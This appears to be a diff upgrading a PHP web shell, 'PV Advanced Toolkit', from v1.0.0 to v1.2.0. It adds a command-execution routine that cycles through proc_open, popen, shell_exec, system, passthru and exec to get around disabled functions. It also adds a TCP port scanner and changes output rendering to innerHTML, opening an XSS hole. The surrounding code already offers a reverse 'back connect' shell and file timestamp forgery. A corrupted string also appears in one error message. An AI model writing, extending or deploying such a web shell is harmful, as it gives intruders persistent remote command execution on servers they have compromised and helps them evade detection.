@@ -99,6 +99,106 @@ if ($authenticated && isset($_GET['action_get'])) {
     }
 }
 
+/**
+ * Checks if a function exists and is not disabled in php.ini.
+ *
+ * @param string $function_name The name of the function to check.
+ * @return bool True if the function is callable, false otherwise.
+ */
+function is_callable_shell_func($function_name) {
+    if (!function_exists($function_name)) {
+        return false;
+    }
+    $disabled_functions = @ini_get('disable_functions');
+    if ($disabled_functions) {
+        $disabled_array = array_map('trim', explode(',', $disabled_functions));
+        if (in_array($function_name, $disabled_array)) {
+            return false;
+        }
+    }
+    return true;
+}
+
+/**
+ * Executes a shell command using a fallback mechanism to find an available execution function.
+ * Tries functions in the order of: proc_open, popen, shell_exec, system, passthru, exec.
+ *
+ * @param string $command The command to execute.
+ * @return string The output of the command.
+ */
+function execute_command_with_fallback($command) {
+    $full_command_redirect = $command . ' 2>&1';
+
+    // Priority 1: proc_open (more control, captures stderr separately)
+    if (is_callable_shell_func('proc_open')) {
+        $descriptorspec = [
+           0 => ["pipe", "r"],  // stdin
+           1 => ["pipe", "w"],  // stdout
+           2 => ["pipe", "w"]   // stderr
+        ];
+        $pipes = [];
+        $process = @proc_open($command, $descriptorspec, $pipes, $_SESSION['terminal_cwd'] ?? getcwd());
+        if (is_resource($process)) {
+            @fclose($pipes[0]);
+            $stdout = @stream_get_contents($pipes[1]);
+            $stderr = @stream_get_contents($pipes[2]);
+            @fclose($pipes[1]);
+            @fclose($pipes[2]);
+            @proc_close($process);
+            return $stdout . $stderr;
+        }
+    }
+
+    // Priority 2: popen
+    if (is_callable_shell_func('popen')) {
+        $handle = @popen($full_command_redirect, 'r');
+        if ($handle) {
+            $output = '';
+            while (!feof($handle)) {
+                $output .= fread($handle, 8192);
+            }
+            @pclose($handle);
+            return $output;
+        }
+    }
+
+    // Priority 3: shell_exec
+    if (is_callable_shell_func('shell_exec')) {
+        $output = @shell_exec($full_command_redirect);
+        if ($output !== null) {
+            return $output;
+        }
+    }
+
+    // Priority 4: system (captures output buffer)
+    if (is_callable_shell_func('system')) {
+        ob_start();
+        @system($full_command_redirect, $return_var);
+        $output = ob_get_contents();
+        ob_end_clean();
+        return $output;
+    }
+
+    // Priority 5: passthru (captures output buffer)
+    if (is_callable_shell_func('passthru')) {
+        ob_start();
+        @passthru($full_command_redirect, $return_var);
+        $output = ob_get_contents();
+        ob_end_clean();
+        return $output;
+    }
+
+    // Priority 6: exec
+    if (is_callable_shell_func('exec')) {
+        $output_array = [];
+        @exec($full_command_redirect, $output_array, $return_var);
+        return implode("\n", $output_array);
+    }
+
+    return "[Error] All command execution backends (proc_open, popen, shell_exec, system, passthru, exec) are disabled or failed.";
+}
+
+
 function command_exists($command) {
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
         $result = @shell_exec("where " . escapeshellarg($command) . " 2> NUL");
@@ -311,6 +411,49 @@ function do_ping($host) {
     return $output ?: "Ping failed or no output.";
 }
 
+function do_port_scan($host, $ports) {
+    $host = trim($host);
+    if (empty($host)) return "No host provided.";
+    
+    $ports_to_scan = [];
+    $port_ranges = explode(',', $ports);
+    foreach ($port_ranges as $range) {
+        if (strpos($range, '-') !== false) {
+            list($start, $end) = explode('-', $range);
+            $start = intval($start);
+            $end = intval($end);
+            if ($start > 0 && $end > 0 && $start <= $end) {
+                for ($i = $start; $i <= $end; $i++) {
+                    $ports_to_scan[] = $i;
+                }
+            }
+        } else {
+            $port = intval($range);
+            if ($port > 0) {
+                $ports_to_scan[] = $port;
+            }
+        }
+    }
+    $ports_to_scan = array_unique($ports_to_scan);
+    sort($ports_to_scan);
+
+    if (empty($ports_to_scan)) {
+        return "No valid ports specified.";
+    }
+
+    $output = "Scanning " . htmlspecialchars($host) . "...\n\n";
+    foreach ($ports_to_scan as $port) {
+        $connection = @fsockopen($host, $port, $errno, $errstr, 1);
+        if (is_resource($connection)) {
+            $output .= "Port " . $port . " is <span style='color:lime;'>open</span>.\n";
+            fclose($connection);
+        } else {
+            $output .= "Port " . $port . " is <span style='color:red;'>closed</span>.\n";
+        }
+    }
+    return $output;
+}
+
 function do_dns_lookup($host) {
     $host = trim($host);
     if (empty($host)) return "No host provided.";
@@ -519,11 +662,10 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                          if(empty($output)) $output = "[Error] Path does not exist: " . htmlspecialchars($new_dir);
                     }
                 } else {
-                    $output = @shell_exec($command . ' 2>&1');
-                    if ($output === null && $command !== "") {
-                        $output = "[Info] Command executed, no output, or an error occurred that suppressed output.";
-                    } elseif ($output === false) {
-                        $output = "[Error] Failed to execute command (shell_exec returned false).";
+                    if ($command !== "") {
+                        $output = execute_command_with_fallback($command);
+                    } else {
+                        $output = "";
                     }
                 }
                 $response = ['status' => 'success', 'output' => trim($output ?? ''), 'cwd' => $_SESSION['terminal_cwd']];
@@ -888,7 +1030,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 if (!$path) {
                     $response['message'] = '[Error] Item not found: ' . htmlspecialchars($_POST['path']);
                 } elseif ($timestamp === false) {
-                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use YYYY-MM-DD HH:MM:SS.';
+                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use<x_bin_342>-MM-DD HH:MM:SS.';
                 } else {
                     if (@touch($path, $timestamp)) {
                         $response = ['status' => 'success', 'message' => 'Timestamp updated for ' . htmlspecialchars(basename($path)) . ' to ' . date("Y-m-d H:i:s", $timestamp)];
@@ -905,11 +1047,11 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             $sub_action = $_POST['sub_action'] ?? 'none';
             $output = '[Error] Invalid network action or parameters.';
             $host_param = trim($_POST['host'] ?? $_POST['ip'] ?? '');
-            $port_param_raw = trim($_POST['port'] ?? $_POST['backport'] ?? '');
+            $port_param_raw = trim($_POST['port'] ?? $_POST['backport'] ?? $_POST['scan_ports'] ?? '');
             $pass_param = $_POST['pass'] ?? $_POST['bind_pass'] ?? '';
             $port_param = 0;
 
-            if (is_numeric($port_param_raw)) {
+            if (is_numeric($port_param_raw) && strpos($port_param_raw, ',') === false && strpos($port_param_raw, '-') === false) {
                 $port_val = intval($port_param_raw);
                 if ($port_val > 0 && $port_val < 65536) { $port_param = $port_val; }
             }
@@ -922,6 +1064,13 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 case 'dns':
                     if (!empty($host_param)) { $output = do_dns_lookup($host_param); }
                     else { $output = "[Error] No host provided for DNS lookup."; }
+                    break;
+                case 'port_scan':
+                    if (!empty($host_param) && !empty($port_param_raw)) {
+                        $output = do_port_scan($host_param, $port_param_raw);
+                    } else {
+                        $output = "[Error] Host and Port(s) are required for Port Scan.";
+                    }
                     break;
                 case 'php_back_connect':
                     if (!empty($host_param) && $port_param > 0) {
@@ -997,7 +1146,7 @@ endif;
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced Toolkit v1.0.0</title>
+    <title>Advanced Toolkit v1.2.0</title>
     <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzBmZiIgZD0iTTEyIDJDNi40NzcgMiAyIDYuNDc3IDIgMTJzNC40NzcgMTAgMTAgMTAgMTAtNC40NzcgMTAtMTBTMTcuNTIzIDIgMTIgMnptMCAxOGMtNC40MTEgMC04LTMuNTg5LTgtOHMzLjU4OS04IDgtOCA4IDMuNTg5IDggOC0zLjU4OSA4LTggOHpNODUuNSAxMC41Yy44MjggMCAxLjUuNjcyIDEuNSAxLjVzLS42NzIgMS41LTEuNSAxLjVNNyAxMi44MjggNyAxMnMuNjcyLTEuNSAxLjUtMS41em03IDBjLjgyOCAwIDEuNS42NzIgMS41IDEuNXMwLS42NzIgMS41LTEuNSAxLjVTMTQgMTIuODI4IDE0IDEyczAuNjcyLTEuNSAxLjUtMS41em0tMy41IDRjLTIuMzMxIDAtNC4zMS0xLjQ2NS01LjExNi0zLjVoMTAuMjMyQzE2LjMxIDE2LjAzNSAxNC4zMzEgMTcuNSAxMiAxNy41eiIvPjwvc3ZnPg==">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -1063,6 +1212,7 @@ endif;
         .inputz { background: #222; border: 1px solid #0ff; color: #0ff; padding: 8px; width: 200px; border-radius: 4px; font-family: 'Orbitron', sans-serif;}
         #network-results-area { clear: both; background: #000; color: #0f0; padding: 15px; min-height: 150px; max-height: 300px; overflow-y: scroll; border: 1px solid #055; margin-top: 20px; white-space: pre-wrap; font-family: 'Consolas', 'Monaco', monospace; font-size: 0.9em; border-radius: 5px; }
         #network-results-area:empty::before { content: "Network tool results will appear here..."; color: #555; }
+        #network-results-area span { color:lime; } #network-results-area span[style*="color:red"] { color:red !important; }
         .net-warning { color: #ff0; font-size: 0.8em; margin-top: 5px; display: block; text-align: center; }
         #phpinfo-iframe { width:100%; height:600px; border:1px solid #055; border-radius: 3px; }
         .hidden { display: none !important; }
@@ -1084,7 +1234,7 @@ endif;
 <body>
     <div class="container">
         <header>
-            <h1>💀 PV Advanced Toolkit v1.0.0</h1>
+            <h1>💀 PV Advanced Toolkit v1.2.0</h1>
             <form method="post" class="logout-form">
                 <input type="hidden" name="action" value="logout">
                 <button type="submit">Logout</button>
@@ -1173,9 +1323,14 @@ endif;
                     <tr><td>Host/IP (Ping):</td><td><input class="inputz" type="text" name="ping_host" value="google.com" required></td></tr>
                     <tr><td colspan="2" align="center"><button class="inputzbut" type="submit">Ping</button></td></tr>
                 </table></form>
-                <form id="dns-form"><table>
+                <form id="dns-form" style="margin-bottom:15px;"><table>
                     <tr><td>Host (DNS Lookup):</td><td><input class="inputz" type="text" name="dns_host" value="google.com" required></td></tr>
                     <tr><td colspan="2" align="center"><button class="inputzbut" type="submit">Lookup DNS</button></td></tr>
+                </table></form>
+                <form id="port-scan-form"><table>
+                    <tr><td>Host/IP (Port Scan):</td><td><input class="inputz" type="text" name="scan_host" value="localhost" required></td></tr>
+                     <tr><td>Ports (e.g. 80,443,22-25):</td><td><input class="inputz" type="text" name="scan_ports" value="80,443,21,22,25,3306" required></td></tr>
+                    <tr><td colspan="2" align="center"><button class="inputzbut" type="submit">Scan Ports</button></td></tr>
                 </table></form>
             </fieldset>
             <div id="network-results-area"></div>
@@ -1191,7 +1346,7 @@ endif;
                     <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Toolkit GIF" style="width: 200px; height: 200px; margin-right: 20px; border-radius: 5px; flex-shrink: 0;">
                     <div style="flex-grow: 1;">
                         <h2>About PV Advanced Toolkit</h2>
-                        <p><strong>Version:</strong> 1.0.0</p>
+                        <p><strong>Version:</strong> 1.2.0</p>
                         <p>This toolkit is a comprehensive PHP-based web shell and server management interface, designed for server administrators and security professionals for system inspection, management, and basic network operations.</p>
                     </div>
                 </div>
@@ -1230,6 +1385,7 @@ endif;
                             <li><strong>PHP Foreground Back Connect Shell:</strong> Connects back to a specified IP and port, providing an interactive shell. (Page will hang while active)</li>
                             <li><strong>Ping Utility:</strong> Sends ICMP echo requests to a specified host.</li>
                             <li><strong>DNS Lookup Utility:</strong> Retrieves DNS records for a specified host.</li>
+                             <li><strong>Port Scanner:</strong> Checks for open TCP ports on a target host.</li>
                         </ul>
                     </li>
                     <li><strong>PHP Info Display:</strong> Shows the full output of `phpinfo()` in an isolated iframe for detailed PHP environment inspection.</li>
@@ -1437,7 +1593,7 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         else {
-            line.textContent = text;
+            line.innerHTML = text; // Allow HTML for port scan results
         }
         terminalOutput.appendChild(line);
         terminalOutput.scrollTop = terminalOutput.scrollHeight;
@@ -1737,7 +1893,11 @@ document.addEventListener('DOMContentLoaded', function() {
         networkResultsArea.innerHTML = 'Executing... <i class="fas fa-spinner fa-spin"></i>';
         data.sub_action = sub_action;
         const result = await sendAjaxRequest('network_tool', data);
-        networkResultsArea.textContent = result.output || result.message || '[Error] Unknown network response.';
+        if (sub_action === 'port_scan') {
+            networkResultsArea.innerHTML = result.output || result.message || '[Error] Unknown network response.';
+        } else {
+            networkResultsArea.textContent = result.output || result.message || '[Error] Unknown network response.';
+        }
     }
 
     async function sendForegroundNetworkAjaxRequest(sub_action, data = {}) {
@@ -1774,6 +1934,13 @@ document.addEventListener('DOMContentLoaded', function() {
     document.getElementById('dns-form').addEventListener('submit', function(e) {
         e.preventDefault();
         sendStandardNetworkAjaxRequest('dns', { host: this.elements['dns_host'].value });
+    });
+    document.getElementById('port-scan-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        sendStandardNetworkAjaxRequest('port_scan', { 
+            host: this.elements['scan_host'].value,
+            scan_ports: this.elements['scan_ports'].value 
+        });
     });
 
     if (document.getElementById('filemanager').classList.contains('active') && fileListingBody.innerHTML.includes('Loading...')) {
